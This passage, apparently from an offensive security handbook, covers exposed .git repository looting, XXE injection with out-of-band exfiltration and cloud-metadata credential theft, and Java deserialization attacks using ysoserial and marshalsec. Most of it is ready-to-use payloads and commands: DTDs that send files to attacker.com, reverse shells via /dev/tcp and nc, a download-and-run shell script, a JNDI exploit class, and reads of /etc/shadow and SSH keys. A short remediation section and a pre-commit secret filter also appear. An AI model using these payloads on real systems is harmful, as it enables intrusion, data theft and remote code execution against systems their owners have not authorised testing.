echo "[+] Scan complete. Results saved to: $OUTPUT_FILE"
```

### Object Analysis and Extraction

**Git Objects Structure**

```bash
# Git objects stored as:
# .git/objects/XX/YYYYYYYYYYYYYYYYYYYYYYYYYYYYYY
# where XXYYYYYY... is object SHA-1 hash

# Decompress and read git object
python3 << 'EOF'
import zlib
import os

object_path = ".git/objects/1a/2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i"

with open(object_path, 'rb') as f:
    compressed = f.read()
    
decompressed = zlib.decompress(compressed)
print(decompressed.decode('utf-8', errors='ignore'))
EOF

# Or use git cat-file
git cat-file -p 1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i

# List all objects
git rev-list --all | while read obj; do
    git cat-file -t "$obj"
done

# Extract all blob objects (file contents)
git rev-list --all | while read obj; do
    if [ "$(git cat-file -t $obj)" = "blob" ]; then
        echo "=== $obj ==="
        git cat-file -p "$obj"
    fi
done
```

**Reflog Analysis**

```bash
# Git reflog shows all branch movements (useful for recovery)
git reflog

# Example output:
# abc1234 (HEAD -> main) HEAD@{0}: reset: moving to abc1234
# def5678 HEAD@{1}: commit: Remove sensitive data
# ghi9012 HEAD@{2}: commit: Add API key

# Check out previous versions
git show def5678  # Show removed commit

# Recover deleted branches
git log --all --graph --decorate --oneline

# May show commits not on current branches
```

**Stash Analysis**

```bash
# Git stash stores temporary work (might contain sensitive data)
git stash list

# If stashes exist:
# stash@{0}: WIP on main: abc1234 Commit message
# stash@{1}: WIP on develop: def5678 Another commit

# View stash contents
git stash show -p stash@{0}

# Extract credentials from stashes
git stash list | while read stash; do
    git show "${stash%%:*}" | grep -iE "password|secret|key"
done
```

### Remote Repository Enumeration

**GitHub/GitLab Public Repository Search**

```bash
# Search for organization repositories
# Via GitHub API
curl -s "https://api.github.com/orgs/target-org/repos?per_page=100" | \
  jq '.[].ssh_url' | head -20

# Find repositories by keyword
curl -s "https://api.github.com/search/repositories?q=target.com+fork:false" | \
  jq '.items[].ssh_url'

# Search for secrets in commit messages
# Via GitHub web interface:
# Search: "target.com" "password" in:commit-message
# Search: "target.com" "api_key" in:commit-message

# Or use GitHub's secret scanning API
# (if secrets previously detected)
curl -s "https://api.github.com/repos/target/repo/secret-scanning/alerts" \
  -H "Authorization: token $GITHUB_TOKEN"
```

**GitLab Public Projects**

```bash
# List projects from instance
curl -s "https://gitlab.example.com/api/v4/projects?per_page=100" | \
  jq '.[].path_with_namespace'

# Clone and analyze
git clone https://gitlab.example.com/team/project.git
cd project
git log --all -p | grep -iE "password|secret|api"

# Check for CI/CD variables (might be exposed in commits)
cat .gitlab-ci.yml | grep -iE "password|secret|token|key"
```

### .git Exploitation for Path Traversal

**Directory Traversal via Git Files**

```bash
# Some servers allow traversal through git directory

# Basic LFI via git
curl https://target.com/.git/config
# May reveal: [core] repositoryformatversion = 0

# Traverse to parent directories
curl https://target.com/.git/../../../../etc/passwd

# Test with various payloads
payloads=(
    ".git/../../../etc/passwd"
    ".git/..\\..\\..\\etc\\passwd"
    ".git;/../../../../etc/passwd"
    ".git/.../.../.../.../etc/passwd"
)

for payload in "${payloads[@]}"; do
    echo "Testing: $payload"
    curl -s "https://target.com/$payload"
done

# If accessible, read sensitive files:
curl https://target.com/.git/../../../../etc/shadow
curl https://target.com/.git/../../../../root/.ssh/id_rsa
```

### Remediation and Prevention Verification

**Git Configuration Hardening**

```bash
# Check git is not exposed in production
# Verify .git directory not accessible
curl -I https://target.com/.git/
# Should return: 403 Forbidden or 404 Not Found
# Not: 200 OK or 301 redirect

# Verify git files not served
for file in HEAD config index objects refs; do
    echo "Testing: .git/$file"
    curl -s -I "https://target.com/.git/$file" | head -1
done

# Should all return 403/404, not 200

# Test with hidden file bypass techniques
curl -s -I "https://target.com/.git%00.html"  # Null byte
curl -s -I "https://target.com/.git%20"       # Trailing space
curl -s -I "https://target.com/.git%0d%0a"    # CRLF
```

**Secret Removal from History**

[Unverified] The following assumes `git filter-branch` successfully removes secrets, but should be verified through history inspection.

```bash
# Remove secrets from git history
git filter-branch --force --index-filter \
  "git rm --cached --ignore-unmatch config.php" \
  --prune-empty --tag-name-filter cat -- --all

# Remove large/sensitive files
git filter-branch --force --tree-filter \
  "rm -f sensitive_file.txt" \
  --prune-empty --tag-name-filter cat -- --all

# Use BFG Repo-Cleaner (faster)
bfg --delete-files database.sql
bfg --replace-text credentials.txt

# Force push after history rewrite
git push --force --all
git push --force --tags

# Verify secrets removed
git log --all -p | grep -i "password\|secret" | wc -l
# Should return 0
```

**Secret Scanning in CI/CD**

```bash
# Add secret scanning to git hooks

# Pre-commit hook: .git/hooks/pre-commit
#!/bin/bash
git diff --cached | grep -iE "password|api.*key|secret|token" && {
    echo "[!] Potential secret detected in commit"
    exit 1
}

chmod +x .git/hooks/pre-commit

# GitHub secret scanning
# Enable in repository settings > Security & analysis > Secret scanning

# GitLab secret detection
# Enable in Project > Settings > CI/CD > Secret detection

# Configure Gitleaks in CI
# .github/workflows/gitleaks.yml or .gitlab-ci.yml
```

---

## Summary: Sensitive Data Exposure Full Coverage

### Data Storage Exposure Flow

1. **Identify Storage Locations** - Database, file system, cache, memory
2. **Assess Encryption** - Check for plaintext, weak hashing, weak encryption
3. **Extract Data** - Download databases, access files, dump memory
4. **Analyze Sensitivity** - Credentials, PII, financial data, intellectual property
5. **Exploitation** - Use extracted data for unauthorized access

### Metadata Extraction Flow

1. **Collect Assets** - Download images, documents, multimedia
2. **Extract Metadata** - EXIF, document properties, timestamps, authors
3. **Analyze Data** - GPS coordinates, versions, internal structures, employee names
4. **Triangulate Information** - Location tracking, timeline creation, social engineering
5. **Exploitation** - Targeting, timing, credential stuffing based on revealed data

### Git Repository Exposure Flow

1. **Detect .git** - Check for exposed directory
2. **Download Repository** - Dump full git objects and history
3. **Analyze History** - Search commits for secrets, credentials, removed data
4. **Recover Sensitive Data** - Extract deleted credentials, API keys, private keys
5. **Exploitation** - Use recovered secrets for system access

### Important Related Topics:

- **Information Disclosure** - Leveraging metadata for social engineering and targeting
- **Authentication Bypass** - Using extracted credentials for unauthorized access
- **Privilege Escalation** - Exploiting exposed keys/tokens for higher privileges
- **Supply Chain Attacks** - Leveraging git history to identify dependencies and attack vectors
- **Forensic Analysis** - Deep analysis of recovered data for comprehensive system compromise

---

# XML & Deserialization Attacks

## XML External Entity (XXE) Injection

XXE vulnerabilities occur when XML parsers process external entity references without proper validation, allowing attackers to read files, trigger SSRF, perform port scanning, and execute denial of service attacks.

### XML Entity Fundamentals

XML entities are data placeholders defined in Document Type Definitions (DTD). External entities reference resources outside the XML document:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Detection Methodology

**Manual Testing Indicators:**

- Application accepts XML input (Content-Type: application/xml, text/xml)
- SOAP/REST APIs processing XML
- File upload functionality accepting XML formats (SVG, DOCX, XLSX, PPTX)
- RSS feed parsers
- Configuration file imports

**Basic Detection Payload:**

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/hostname">]>
<root><data>&test;</data></root>
```

If the hostname appears in the response, XXE is confirmed.

### Exploitation Techniques

**Local File Disclosure:**

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

**Windows-specific paths:**

```xml
<!ENTITY file SYSTEM "file:///c:/windows/win.ini">
<!ENTITY file SYSTEM "file:///c:/boot.ini">
<!ENTITY file SYSTEM "file:///c:/inetpub/wwwroot/web.config">
```

**PHP Wrapper Exploitation:**

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

This base64-encodes the file content, bypassing special character issues.

**Reading Source Code:**

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
```

**Expect Wrapper (RCE - requires PHP expect module):**

```xml
<!ENTITY xxe SYSTEM "expect://id">
```

### Parameter Entity Exploitation

When direct entity reference fails, use parameter entities:

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
  %dtd;
]>
<data>&send;</data>
```

**evil.dtd on attacker server:**

```xml
<!ENTITY % all "<!ENTITY send SYSTEM 'http://attacker.com/?%file;'>">
%all;
```

### XML Bomb (Billion Laughs Attack)

Denial of service through recursive entity expansion:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
]>
<lolz>&lol4;</lolz>
```

### Tools and Automation

**XXEinjector - Advanced XXE Exploitation Framework:**

```bash
# Installation
git clone https://github.com/enjoiz/XXEinjector.git
cd XXEinjector

# Basic file extraction
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/passwd --file=/path/to/request.txt

# Directory enumeration
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/ --file=request.txt --enumeration

# HTTP Out-of-band enumeration
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/passwd --file=request.txt --oob=http --phpfilter

# Java jar:// protocol exploitation
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/passwd --file=request.txt --oob=http --jar

# XSLT injection
ruby XXEinjector.rb --host=192.168.1.100 --path=/etc/passwd --file=request.txt --xslt

# Parameters
# --host: Attacker's IP for OOB callbacks
# --path: Target file/directory path
# --file: HTTP request file containing injection point (marked with XXEINJECT)
# --oob: Out-of-band method (http, ftp, jar)
# --phpfilter: Use PHP filter wrappers
# --enumeration: Enumerate directory contents
# --brute: Brute force file paths
```

**Request template (request.txt):**

```http
POST /api/upload HTTP/1.1
Host: target.com
Content-Type: application/xml
Content-Length: 100

XXEINJECT
```

**Burp Suite XXE Detection:**

- Use Burp Collaborator for OOB detection
- Extensions: Content Type Converter (converts JSON to XML automatically)
- Intruder positions for entity payload injection

**Manual Burp Workflow:**

1. Intercept XML request
2. Insert XXE payload with Burp Collaborator URL
3. Monitor Collaborator for DNS/HTTP callbacks
4. Iterate with file:// paths upon confirmation

**OWASP ZAP:**

```bash
# Passive scanning for XML endpoints
# Active scan with XXE payloads via script
zap-cli quick-scan --spider -r http://target.com
```

## XXE Blind Attacks

Blind XXE occurs when the application processes XML with external entities but doesn't return the parsed content in responses.

### Out-of-Band (OOB) Detection

**DNS-based Detection:**

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">
  %remote;
]>
<data>test</data>
```

**evil.dtd:**

```xml
<!ENTITY % payload SYSTEM "file:///etc/hostname">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://attacker.com/?x=%payload;'>">
%param1;
```

Monitor attacker.com logs for incoming requests containing hostname data.

### Error-Based XXE

Force XML parser errors that leak file contents:

**Initial request:**

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/error.dtd">
  %dtd;
  %error;
]>
<data>test</data>
```

**error.dtd:**

```xml
<!ENTITY % all "<!ENTITY &#37; error SYSTEM 'file:///nonexistent/%file;'>">
%all;
```

The parser attempts to access `file:///nonexistent/[contents-of-passwd]`, generating an error message containing the file data.

### Blind XXE via Modified Content-Type

Many applications accept multiple content types. Test by changing:

```http
Content-Type: application/json â†’ application/xml
Content-Type: application/x-www-form-urlencoded â†’ application/xml
```

Then convert request body to XML format with XXE payload.

### Local DTD File Exploitation

When external DTD loading is blocked, leverage locally available DTD files:

**Linux systems (GNOME):**

```xml
<?xml version="1.0"?>
<!DOCTYPE message [
  <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
  <!ENTITY % ISOamso '
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
  '>
  %local_dtd;
]>
<message>test</message>
```

**Common local DTD paths:**

- Linux: `/usr/share/xml/`, `/usr/share/yelp/dtd/`, `/usr/share/doc/`
- Windows: `C:\Windows\System32\wbem\xml\`, `C:\Program Files\`

### Time-Based Blind XXE

When no error messages or OOB channels exist:

```xml
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/sleep.dtd">
  %dtd;
]>
```

**sleep.dtd (causes processing delay if file exists):**

```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://attacker-slow-server.com/?%file;'>">
%all;
%send;
```

Monitor response time variations to infer successful file reads.

### Blind XXE Tools

**ezXXE - Automated Blind XXE Toolkit:**

```bash
# Installation
git clone https://github.com/BrunoRekaL/ezXXE.git
cd ezXXE
pip install -r requirements.txt

# Start listener server
python3 ezXXE.py -l

# Generates payloads with your server URL
# Monitor for callbacks indicating successful exploitation
```

**Collaborator-based approach:**

```bash
# Use Burp Collaborator or interactsh
interactsh-client

# Insert generated domain in XXE payloads
<!ENTITY % remote SYSTEM "http://[interactsh-domain]/xxe">
```

## SSRF via XXE

XXE enables Server-Side Request Forgery by instructing the XML parser to make requests on behalf of the server.

### Internal Network Scanning

**Port scanning via error messages:**

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://192.168.1.1:22">
]>
<data>&xxe;</data>
```

Different error messages or response times indicate open/closed ports.

**Network range enumeration:**

```xml
<!DOCTYPE data [
  <!ENTITY xxe SYSTEM "http://192.168.1.Â§1Â§:80">
]>
<data>&xxe;</data>
```

Use Burp Intruder to iterate through IP ranges.

### Cloud Metadata Exploitation

**AWS metadata service:**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

This retrieves IAM role names. Follow up with:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/[role-name]">
```

Returns temporary AWS credentials (AccessKeyId, SecretAccessKey, Token).

**Google Cloud:**

```xml
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token">
```

Requires `Metadata-Flavor: Google` header, which XXE cannot set directly. Instead, target:

```xml
<!ENTITY xxe SYSTEM "http://metadata.google.internal/computeMetadata/v1/project/project-id">
```

**Azure:**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01">
```

Requires `Metadata: true` header. Attempt header injection via CRLF:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/metadata/instance?api-version=2021-02-01%0D%0AMetadata:%20true">
```

### Internal Service Access

**Redis exploitation:**

```xml
<!ENTITY xxe SYSTEM "http://localhost:6379/">
```

Limited by protocol restrictions, but can trigger SSRF-chained exploits.

**Elasticsearch:**

```xml
<!ENTITY xxe SYSTEM "http://localhost:9200/_cluster/health">
```

**Docker API:**

```xml
<!ENTITY xxe SYSTEM "http://localhost:2375/containers/json">
```

### Protocol Handlers for SSRF

**FTP protocol:**

```xml
<!ENTITY xxe SYSTEM "ftp://internal-ftp.local/file.txt">
```

**Gopher protocol (powerful for raw TCP):**

```xml
<!ENTITY xxe SYSTEM "gopher://localhost:6379/_AUTH%20password">
```

Gopher allows sending arbitrary TCP data, enabling Redis/Memcached exploitation.

**File protocol as SSRF:**

```xml
<!ENTITY xxe SYSTEM "file:///proc/self/environ">
```

Leaks environment variables that may contain database credentials, API keys.

### SSRF Filter Bypasses

**DNS rebinding:**

- Register domain resolving to public IP initially, then switch to 127.0.0.1
- XXE fetches DTD from public IP, then resolves to localhost on subsequent requests

**Alternative IP representations:**

```xml
<!-- Decimal notation -->
<!ENTITY xxe SYSTEM "http://2130706433/">  <!-- 127.0.0.1 -->

<!-- Octal notation -->
<!ENTITY xxe SYSTEM "http://0177.0.0.1/">

<!-- Hex notation -->
<!ENTITY xxe SYSTEM "http://0x7f.0x0.0x0.0x1/">

<!-- Mixed encoding -->
<!ENTITY xxe SYSTEM "http://127.1/">
```

**URL encoding bypass:**

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta%2Ddata/">
```

**IPv6 localhost:**

```xml
<!ENTITY xxe SYSTEM "http://[::1]/">
<!ENTITY xxe SYSTEM "http://[0000:0000:0000:0000:0000:0000:0000:0001]/">
```

## Out-of-Band Data Exfiltration

OOB techniques extract data through secondary channels when direct responses are unavailable.

### HTTP-Based Exfiltration

**Basic OOB exfiltration:**

```xml
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
  %dtd;
  %send;
]>
```

**exfil.dtd:**

```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://attacker.com/collect.php?data=%file;'>">
%all;
```

**collect.php (server-side):**

```php
<?php
file_put_contents('exfil.log', base64_decode($_GET['data']), FILE_APPEND);
?>
```

### FTP-Based Exfiltration

More reliable for large file transfers:

```xml
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
  <!ENTITY % dtd SYSTEM "http://attacker.com/ftp.dtd">
  %dtd;
  %send;
]>
```

**ftp.dtd:**

```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'ftp://attacker.com/%file;'>">
%all;
```

**FTP server setup (Kali Linux):**

```bash
# Install pyftpdlib
pip3 install pyftpdlib

# Start anonymous FTP server
python3 -m pyftpdlib -p 21 -w

# Monitor connections
tail -f /var/log/pyftpdlib.log
```

### DNS-Based Exfiltration

Bypasses HTTP/FTP filtering but limited by DNS label length (63 characters):

```xml
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/dns.dtd">
  %dtd;
  %send;
]>
```

**dns.dtd:**

```xml
<!ENTITY % all "<!ENTITY &#37; send SYSTEM 'http://%file;.attacker.com'>">
%all;
```

The DNS query will contain file data as subdomain.

**DNS exfiltration server:**

```bash
# Using dnsbin.zhack.ca (public service)
# Insert in payload: http://[unique-id].dnsbin.zhack.ca
# Monitor at: http://dnsbin.zhack.ca/[unique-id]

# Self-hosted with dnschef
git clone https://github.com/iphelix/dnschef.git
cd dnschef
python dnschef.py --fakeip=YOUR_IP -q
```

### Chunked Data Exfiltration

For files exceeding URL/DNS length limits:

**Python OOB server with chunking:**

```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import base64

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if 'data=' in self.path:
            chunk = self.path.split('data=')[1]
            decoded = base64.b64decode(chunk)
            with open('exfil_data.txt', 'ab') as f:
                f.write(decoded)
            self.send_response(200)
            self.end_headers()

HTTPServer(('0.0.0.0', 8000), ExfilHandler).serve_forever()
```

**DTD for chunked exfil:**

```xml
<!ENTITY % start "<!ENTITY &#37; file SYSTEM 'php://filter/read=convert.base64-encode/resource=/etc/passwd'>">
%start;
<!ENTITY % chunk1 "<!ENTITY &#37; send1 SYSTEM 'http://attacker.com/?data=%file;'>">
%chunk1;
%send1;
```

### Java Jar Protocol Exfiltration

Java XML parsers support jar:// protocol for remote jar file access:

```xml
<!DOCTYPE data [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "jar:http://attacker.com/evil.jar!/evil.dtd">
  %dtd;
]>
```

**Creating evil.jar:**

```bash
# Create evil.dtd
echo '<!ENTITY % all "<!ENTITY &#37; send SYSTEM '"'"'http://attacker.com/?%file;'"'"'>">%all;' > evil.dtd

# Package into jar
jar -cvf evil.jar evil.dtd

# Host on web server
python3 -m http.server 80
```

### OOB via SVG File Upload

SVG files are XML-based and processed by many applications:

**malicious.svg:**

```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [
  <!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/svg.dtd">
  %dtd;
  %send;
]>
<svg width="128" height="128" xmlns="http://www.w3.org/2000/svg">
  <text x="0" y="16" font-size="16">&exfil;</text>
</svg>
```

Upload to image processing features, profile pictures, or document converters.

### XSLT Injection for Exfiltration

XSLT (Extensible Stylesheet Language Transformations) processors can execute XXE:

```xml
<?xml version="1.0"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
    <xsl:value-of select="$file"/>
  </xsl:template>
</xsl:stylesheet>
```

**OOB XSLT:**

```xml
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:template match="/">
    <xsl:variable name="payload" select="document('http://attacker.com/xslt.xml')"/>
  </xsl:template>
</xsl:stylesheet>
```

### Exfiltration Encoding Techniques

**Hex encoding (bypass base64 filters):**

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=php://filter/convert.base64-encode/resource=/etc/passwd">
```

Double encoding obfuscates payload.

**UTF-7 encoding:**

```xml
<!ENTITY xxe SYSTEM "php://filter/convert.iconv.UTF-8.UTF-7/resource=/etc/passwd">
```

**ROT13 encoding:**

```xml
<!ENTITY xxe SYSTEM "php://filter/string.rot13/resource=/etc/passwd">
```

Useful when certain characters are filtered.

### Defense Evasion

**Whitespace injection:**

```xml
<!ENTITY % file SYSTEM "  file:///etc/passwd  ">
```

**Case variation:**

```xml
<!ENTITY xxe SYSTEM "FiLe:///etc/passwd">
```

**Unicode normalization:**

```xml
<!ENTITY xxe SYSTEM "file://\u002fetc\u002fpasswd">
```

**Null byte injection (PHP < 5.3.4):**

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd%00.jpg">
```

---

## XML External Entity (XXE) Injection

### Fundamentals

XML parsers process Document Type Definitions (DTD) that can reference external entities. When user input influences XML parsing without proper sanitization, attackers can exploit this to read files, perform SSRF, or cause denial of service.

### Basic XXE Payloads

**Classic file read (Linux):**

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>
  <data>&xxe;</data>
</root>
```

**Windows file read:**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>
<root>&xxe;</root>
```

**Blind XXE with out-of-band exfiltration:**

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd">%xxe;]>
<root></root>
```

External DTD file (xxe.dtd on attacker server):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Advanced XXE Techniques

**Parameter entity exfiltration:**

```xml
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % dtd SYSTEM "http://attacker.com/evil.dtd">
%dtd;
%send;
]>
```

**SOAP XXE:**

```xml
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<soap:Body>
  <foo>&xxe;</foo>
</soap:Body>
</soap:Envelope>
```

**SVG-based XXE:**

```xml
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<text>&xxe;</text>
</svg>
```

### Testing for XXE

**Burp Suite workflow:**

```bash
# Identify XML input points
# Send to Repeater
# Inject DTD declaration
# Monitor responses and out-of-band interactions
```

**xxeserv - Python XXE exploitation server:**

```bash
# Installation
git clone https://github.com/staaldraad/xxeserv
cd xxeserv
go build

# Start server for OOB XXE
./xxeserv -p 8000 -w -wd public
```

**Manual testing with curl:**

```bash
# Test basic XXE
curl -X POST http://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'

# Test with PHP filter wrapper
curl -X POST http://target.com/api \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]><root>&xxe;</root>'
```

### XXE to RCE

**expect:// wrapper (PHP with expect extension):**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "expect://id">]>
<root>&xxe;</root>
```

**Via SSRF to internal services:**

```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://localhost:8080/admin/deploy">]>
<root>&xxe;</root>
```

### Defense Bypass Techniques

**UTF-16 encoding:**

```python
import codecs
payload = '<?xml version="1.0" encoding="UTF-16"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
utf16_payload = codecs.encode(payload, 'utf-16')
```

**HTML entities:**

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">]>
<root>&#x25;xxe;</root>
```

---

## Java Deserialization Exploits

### Fundamentals

Java serialization converts objects to byte streams. When applications deserialize untrusted data without validation, attackers can execute arbitrary code by crafting malicious serialized objects that trigger dangerous method chains (gadget chains) during deserialization.

**Serialized Java object signature:**

- Hex: `ac ed 00 05`
- Base64: `rO0AB`

### Detection

**Identifying serialized data:**

```bash
# Check HTTP requests/responses for magic bytes
echo "rO0ABXNy..." | base64 -d | xxd | head

# Common locations:
# - Cookies (JSESSIONID)
# - Hidden form fields
# - API request/response bodies
# - ViewState (legacy frameworks)
```

**Burp Suite detection:**

- Use "Java Deserialization Scanner" extension
- Search for `ac ed 00 05` in hex view
- Monitor for Java stack traces after mutation

### Exploitation Tools

**ysoserial - gadget chain payload generator:**

```bash
# Installation
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# List available gadget chains
java -jar ysoserial-all.jar

# Generate payload - CommonsCollections1 (Apache Commons Collections <= 3.2.1)
java -jar ysoserial-all.jar CommonsCollections1 'nc -e /bin/sh attacker.com 4444' | base64

# Generate payload - CommonsCollections6 (more stable)
java -jar ysoserial-all.jar CommonsCollections6 'curl http://attacker.com/$(whoami)' | base64 -w0

# Jdk7u21 gadget (Oracle JDK <= 7u21)
java -jar ysoserial-all.jar Jdk7u21 'wget http://attacker.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh' | base64

# Spring gadgets
java -jar ysoserial-all.jar Spring1 'touch /tmp/pwned' | base64
java -jar ysoserial-all.jar Spring2 'id' | base64

# Generate DNS callback payload for blind testing
java -jar ysoserial-all.jar JRMPClient 'attacker.com:1099' | base64
```

**Common gadget chains and their requirements:**

- **CommonsCollections1-7**: Apache Commons Collections 3.1-3.2.1
- **Spring1-2**: Spring Framework (various versions)
- **Jdk7u21**: Oracle JDK <= 7u21
- **Jdk8u20**: Oracle JDK <= 8u20
- **Hibernate1-2**: Hibernate ORM
- **Groovy1**: Groovy <= 2.3.9
- **JBossInterceptors1**: JBoss

**marshalsec - testing non-Java serialization:**

```bash
# Clone and build
git clone https://github.com/mbechler/marshalsec
cd marshalsec
mvn clean package -DskipTests

# Start JRMP listener for JRMPClient callbacks
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://attacker.com:8000/#Exploit" 1099

# Start LDAP listener
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8000/#Exploit" 1389
```

### Exploitation Workflow

**1. Identify vulnerable endpoint:**

```bash
# Look for Java frameworks
# Check headers: Server: Apache-Coyote, X-Powered-By: Servlet
# Test with benign serialized object
```

**2. Determine available gadgets:**

```bash
# Fingerprint Java version and libraries
# Check error messages for classpath details
# Use sleep-based payloads to test gadget chains

# Time-based detection payload
java -jar ysoserial-all.jar CommonsCollections5 'ping -c 10 127.0.0.1'
```

**3. Exploit execution:**

```bash
# Generate reverse shell payload
java -jar ysoserial-all.jar CommonsCollections6 'bash -i >& /dev/tcp/attacker.com/4444 0>&1' > payload.ser

# Base64 encode for HTTP transmission
cat payload.ser | base64 -w0 > payload.b64

# Send via curl
curl -X POST http://target.com/endpoint \
  -H "Content-Type: application/x-java-serialized-object" \
  --data-binary @payload.ser

# Or in cookie
curl http://target.com/ \
  --cookie "JSESSIONID=$(cat payload.b64)"
```

### Advanced Techniques

**Bypass WAF with encoding chains:**

```bash
# GZIP compression
java -jar ysoserial-all.jar CommonsCollections6 'id' | gzip | base64

# Custom ObjectInputStream subclass detection bypass
# [Inference] Some applications use custom deserialization logic that may validate class types
```

**Chaining with JNDI injection:**

```bash
# Setup malicious LDAP server
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker.com:8000/#Exploit" 1389

# Host exploit class
cat > Exploit.java <<EOF
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("nc -e /bin/bash attacker.com 4444");
        } catch (Exception e) {}
    }
}
EOF
javac Exploit.java
python3 -m http.server 8000

# Generate JNDI payload
